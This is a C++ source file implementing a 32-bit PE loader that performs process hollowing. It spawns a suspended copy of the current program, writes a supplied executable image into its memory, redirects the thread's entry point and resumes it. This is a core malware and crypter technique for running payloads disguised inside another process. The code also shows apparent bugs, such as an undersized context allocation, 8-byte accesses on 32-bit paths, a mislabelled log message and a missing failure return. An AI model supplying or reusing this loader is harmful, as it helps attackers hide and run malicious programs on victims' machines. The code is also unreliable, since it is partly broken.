#include "PE32.h"
#include <iostream>
#include <string>
#include "ST.h"
#include "Util.h"

bool peLoader32::load(BYTE* Image)
{
	LOGI("peLoader64::load - start");
	IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols
	IMAGE_NT_HEADERS32* NtHeader; // For Nt PE Header objects & symbols
	IMAGE_SECTION_HEADER* SectionHeader;

	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;

	CONTEXT* CTX;
	LPVOID ImageBase = 0; //Base address of the image
	void* pImageBase; // Pointer to the image base

	int count;
	int mode = 32;
	char CurrentFilePath[1024];

	DOSHeader = PIMAGE_DOS_HEADER(Image); // Initialize Variable
	NtHeader = PIMAGE_NT_HEADERS32((BYTE*)Image + DOSHeader->e_lfanew); // Initialize
	ImageBase = (LPVOID)NtHeader->OptionalHeader.ImageBase;

	GetModuleFileNameA(0, CurrentFilePath, 1024); // path to current executable

	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) // Check if image is a PE File.
	{
		ZeroMemory(&PI, sizeof(PI)); // Null the memory
		ZeroMemory(&SI, sizeof(SI)); // Null the memory

		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) // Create a new instance of current
		{
			// Allocate memory for the context.
			CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL; // Context is allocated

			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
			{
				// Read instructions
				ReadProcessMemory(PI.hProcess, LPCVOID(CONTEXTBX(CTX) + 16), LPVOID(&ImageBase), 8, 0);
				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase), NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

				// Write the image to the process
				WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
				{
					if (mode == 64)
					{
						SectionHeader = PIMAGE_SECTION_HEADER(uint64_t(Image) + DOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32) + (count * IMAGE_SIZEOF_SECTION_HEADER));
						WriteProcessMemory(PI.hProcess, LPVOID(uint64_t(pImageBase) + SectionHeader->VirtualAddress), LPVOID(uint64_t(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
					}
					else
					{
						SectionHeader = PIMAGE_SECTION_HEADER(uint32_t(Image) + DOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32) + (count * IMAGE_SIZEOF_SECTION_HEADER));
						WriteProcessMemory(PI.hProcess, LPVOID(uint32_t(pImageBase) + SectionHeader->VirtualAddress), LPVOID(uint32_t(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
					}
				}
				WriteProcessMemory(PI.hProcess, LPVOID(CONTEXTBX(CTX) + 16), LPVOID(&NtHeader->OptionalHeader.ImageBase), 8, 0);

				// Move address of entry point to the eax register
				CONTEXTAX(CTX) = uint32_t(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;

				SetThreadContext(PI.hThread, LPCONTEXT(CTX)); // Set the context
				ResumeThread(PI.hThread); // Start the process/call main()

				return true;
			}
		}
	}
}